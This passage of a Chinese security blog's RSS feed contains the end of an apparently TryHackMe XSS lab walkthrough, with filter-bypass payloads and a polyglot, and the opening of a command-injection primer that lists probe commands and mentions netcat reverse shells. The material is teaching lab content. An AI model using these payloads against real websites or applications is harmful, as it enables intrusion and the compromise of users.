&lt;p&gt;&lt;code&gt;&amp;lt;/textarea&amp;gt;&amp;lt;script&amp;gt;alert(&#39;THM&#39;);&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318145402800.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318145411794.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;上述有效负载的重要部分是 &lt;code&gt;&amp;lt;/textarea&amp;gt;&lt;/code&gt;，它会导致 textarea 元素关闭，以便脚本运行。&lt;/p&gt;
&lt;h2 id=&#34;level-four&#34;&gt;Level Four:
&lt;/h2&gt;&lt;p&gt;在表单中输入姓名，会在页面上看到它。此级别看起来类似于 1 级，但在检查页面源代码时，会看到名字反映在一些 JavaScript 代码中。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318145451931.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;必须转义现有的 JavaScript 命令，以便能够运行代码;可以使用以下有效负载 &lt;code&gt;&#39;;alert（&#39;THM&#39;）;//&lt;/code&gt; 从下面的屏幕截图中可以看到，它将执行代码。&lt;code&gt;&#39;&lt;/code&gt; 关闭指定名称的字段，然后 &lt;code&gt;;&lt;/code&gt;表示当前命令的结束，末尾的 则``使它后面的任何内容成为注释，而不是可执行代码。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318145515388.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;level-five&#34;&gt;Level Five:
&lt;/h2&gt;&lt;p&gt;现在，此级别看起来与级别 1 相同，并且名字也会反映在同一个位置。但是，如果尝试有效负载 &lt;code&gt;&amp;lt;script&amp;gt;alert(&#39;THM&#39;);&amp;lt;/script&amp;gt;&lt;/code&gt; ，它将不起作用。当查看页面源代码时，将了解原因。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318145543128.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;script&lt;/code&gt; 会从有效负载中删除，这是因为有一个过滤器可以去除任何具有潜在危险的单词。&lt;/p&gt;
&lt;p&gt;当一个单词从字符串中删除时，你可以尝试一个有用的技巧。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318145609648.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;尝试输入有效负载 &lt;code&gt;&amp;lt;sscriptcript&amp;gt;alert(&#39;THM&#39;);&amp;lt;/sscriptcript&amp;gt;&lt;/code&gt; 并单击输入按钮，将看到一个带有字符串 THM 的警报弹出窗口。&lt;/p&gt;
&lt;h2 id=&#34;level-six&#34;&gt;Level Six:
&lt;/h2&gt;&lt;p&gt;与第二级类似，我们必须从 input 标签的 value 属性中转义，我们可以尝试 &lt;code&gt;&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(&#39;THM&#39;);&amp;lt;/script&amp;gt; &lt;/code&gt;，但这似乎不起作用。让我们检查一下页面源代码，看看为什么这不起作用。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318145640111.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;可以看到 &amp;lt; 和 &amp;gt; 字符从我们的 payload 中被过滤掉，从而阻止我们转义 IMG 标签。为了绕过过滤器，我们可以利用 IMG 标签的其他属性，比如 onload 事件。onload 事件将在 src 属性中指定的图像加载到网页后执行您选择的代码。&lt;/p&gt;
&lt;p&gt;让我们更改 payload 以反映这一点 &lt;code&gt;/images/cat.jpg&amp;quot; onload=&amp;quot;alert(&#39;THM&#39;);&lt;/code&gt; ，然后查看页面源，您将看到这将如何工作。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318145659486.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;polyglots&#34;&gt;Polyglots:
&lt;/h2&gt;&lt;p&gt;XSS 多语言是一串文本，可以一站式转义属性、标签和绕过过滤器。可以在刚刚完成的所有 6 个级别上使用以下多语言，并且它会成功执行代码。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;jaVasCript&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:/*-/*&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;/*\`/*&amp;#39;/*&amp;#34;/**/&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;/* */&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;onerror&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;alert&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;THM&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//%0D%0A%0d%0a//&amp;lt;/stYle/&amp;lt;/titLe/&amp;lt;/teXtarEa/&amp;lt;/scRipt/--!&amp;gt;\x3csVg/&amp;lt;sVg/oNloAd=alert(&amp;#39;THM&amp;#39;)//&amp;gt;\x3e
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</description>
        </item>
        <item>
        <title>命令注入基础</title>
        <link>https://Yerucrem.github.io/p/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</link>
        <pubDate>Tue, 18 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</guid>
        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/f11677927824a3d078e08a2c300d8ccf225d496d442a2b7c8be0ca2d5adf6d9a.png" alt="Featured image of post 命令注入基础" /&gt;&lt;h1 id=&#34;命令注入&#34;&gt;命令注入
&lt;/h1&gt;&lt;h2 id=&#34;分类&#34;&gt;分类
&lt;/h2&gt;&lt;p&gt;命令注入主要可以通过以下两种方式之一进行检测：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;盲命令注入&lt;/li&gt;
&lt;li&gt;详细命令注入&lt;/li&gt;
&lt;/ol&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;方法&lt;/th&gt;
          &lt;th&gt;描述&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;盲&lt;/td&gt;
          &lt;td&gt;这种类型的注入是在测试有效负载时应用程序没有直接输出的地方。您必须调查应用程序的行为，以确定您的有效负载是否成功。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;详细&lt;/td&gt;
          &lt;td&gt;这种类型的注入是测试有效负载后从应用程序获得直接反馈的地方。例如，运行 &lt;code&gt;whoami&lt;/code&gt; 命令以查看应用程序在哪个用户下运行。Web 应用程序将直接在页面上输出用户名。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;有用的有效载荷&#34;&gt;有用的有效载荷
&lt;/h2&gt;&lt;h3 id=&#34;linux&#34;&gt;Linux
&lt;/h3&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;有效载荷&lt;/th&gt;
          &lt;th&gt;描述&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;whoami&lt;/td&gt;
          &lt;td&gt;查看应用程序在哪个用户下运行。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;ls&lt;/td&gt;
          &lt;td&gt;列出当前目录的内容。您也许能够找到配置文件、环境文件（令牌和应用程序密钥）等文件，以及更多有价值的内容。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;ping&lt;/td&gt;
          &lt;td&gt;此命令将调用应用程序以挂起。这在测试应用程序是否进行盲命令注入时非常有用。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;sleep&lt;/td&gt;
          &lt;td&gt;这是测试应用程序盲目命令注入时的另一个有用有效负载，其中计算机未安装 &lt;code&gt;ping&lt;/code&gt;。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;nc&lt;/td&gt;
          &lt;td&gt;Netcat 可用于在易受攻击的应用程序上生成反向 shell。您可以使用此立足点在目标计算机上导航，以获取其他服务、文件或提升权限的潜在方法。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;windows&#34;&gt;windows
&lt;/h3&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;有效载荷&lt;/th&gt;
          &lt;th&gt;描述&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;whoami&lt;/td&gt;
          &lt;td&gt;查看应用程序在哪个用户下运行。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;dir&lt;/td&gt;
          &lt;td&gt;列出当前目录的内容。您也许能够找到配置文件、环境文件（令牌和应用程序密钥）等文件，以及更多有价值的内容。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;ping&lt;/td&gt;
          &lt;td&gt;此命令将调用应用程序以挂起。这在测试应用程序是否进行盲命令注入时非常有用。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;timeout&lt;/td&gt;
          &lt;td&gt;此命令还将调用应用程序以挂起。如果未安装 &lt;code&gt;ping&lt;/code&gt; 命令，则它还可用于测试应用程序是否进行盲命令注入。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
</description>
        </item>
        
    </channel>
</rss>
